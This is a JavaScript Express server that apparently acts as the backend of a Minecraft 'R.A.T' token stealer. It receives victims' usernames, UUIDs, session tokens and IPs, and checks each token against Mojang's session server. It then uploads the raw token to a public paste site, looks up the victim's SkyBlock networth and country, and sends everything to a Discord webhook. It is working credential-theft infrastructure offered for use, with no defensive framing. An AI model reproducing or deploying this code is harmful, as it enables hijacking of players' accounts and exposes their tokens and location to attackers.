const getProfiles = require('./utils/networth');
require("dotenv").config();
const { post, get } = require("axios");
const express = require("express");
const mongoose = require("mongoose");
const helmet = require("helmet");
const app = express();
const expressip = require("express-ip");
const port = process.env.PORT || 8080;

app.use(helmet());
app.use(expressip().getIpInfoMiddleware);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
const ipMap = [];

setInterval(() => {
    if (ipMap.length > 0) {
        console.log(`[R.A.T] Cleared map`);
        ipMap.length = 0;
    }
}, 1000 * 60 * 15);

app.post("/", async (req, res) => {
    const requiredFields = ["username", "uuid", "token", "ip"];
    if (!requiredFields.every(field => req.body.hasOwnProperty(field))) {
        console.log(req.body);
        return res.sendStatus(404);
    }

    if (!ipMap.find(entry => entry[0] == req.ipInfo.ip)) ipMap.push([req.ipInfo.ip, 1]);
    else ipMap.forEach(entry => { if (entry[0] == req.ipInfo.ip) entry[1]++ });

    if (ipMap.find(entry => entry[0] == req.ipInfo.ip && entry[1] >= 5)) {
        console.log(`[R.A.T] Rejected banned IP (${req.ipInfo.ip})`);
        return res.sendStatus(404);
    }

    try {
        const response = await post("https://sessionserver.mojang.com/session/minecraft/join", {
            accessToken: req.body.token,
            selectedProfile: req.body.uuid,
            serverId: req.body.uuid
        }).then(res => {
            if (res.status === 403) {
                return "Non-License";
            } else if (res.status === 200) {
                return "License";
            } else {
                return `Unexpected status: ${res.status}`;
            }
        }).catch(() => "Request failed");

        let webhookData = {
            content: `@everyone - ${req.body.username}`,
            embeds: [{
                fields: [],
                color: 2175365,
                footer: {
                    "text": "😈 Autistic? 😈",
                },
                timestamp: new Date()
            }],
            attachments: []
        };

        if (response !== "Non-License") {
            const [shorttoken, profiles, country] = await Promise.all([
                post("https://hst.sh/documents/", req.body.token).then(res => res.data.key).catch(() => "Error uploading"),
                getProfiles(req.body.uuid).then(profileData => {
                    if (profileData) {
                        return Object.values(profileData.profiles).map(profile => 
                            `[${profile.sblvl}]${profile.unsoulboundNetworth} - ${profile.gamemode}`
                        ).join('\n');
                    }
                    return '';
                }),
                fetchCountry(req.body.ip)
            ]);

            const checkToken = shorttoken === 'Error uploading' ? 'Invalid Token' : `[Minecraft Token](https://hst.sh/${shorttoken})`;
            const planckeUrl = `[Plancke.io](https://plancke.io/hypixel/player/stats/${req.body.username})`;
            const cryptUrl = `[SkyCrypt](https://sky.shiiyu.moe/stats/${req.body.username})`;

            webhookData.embeds[0].fields.push(
                { name: 'Statistics', value: `****${planckeUrl}**** ****${cryptUrl}****`, inline: false },
                { name: 'Token', value: `****${checkToken}****`, inline: true },
                { name: 'Profiles', value: `**\`\`\`${profiles}\`\`\`**`, inline: false },
                { name: 'Country', value: `**\`\`\`${country}\`\`\`**`, inline: false },
            );
        }

        webhookData.embeds[0].fields.push({
            name: 'License Status', value: `**\`\`\`${response}\`\`\`**`, inline: false
        });

        await post(process.env.WEBHOOK, webhookData);
        console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`);
    } catch (err) {
        console.error(err);
    }
    res.send("OK");
});

app.listen(port, () => {
    console.log(`[R.A.T] Listening at port ${port}`);
});

async function fetchCountry(ip) {
    const apiUrl = `http://ip-api.com/json/${ip}`;
    try {
        const response = await fetch(apiUrl);
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        const data = await response.json();
        return data.country;
    } catch (error) {
        console.error('Error fetching country:', error);
        return 'Unknown';
    }
}
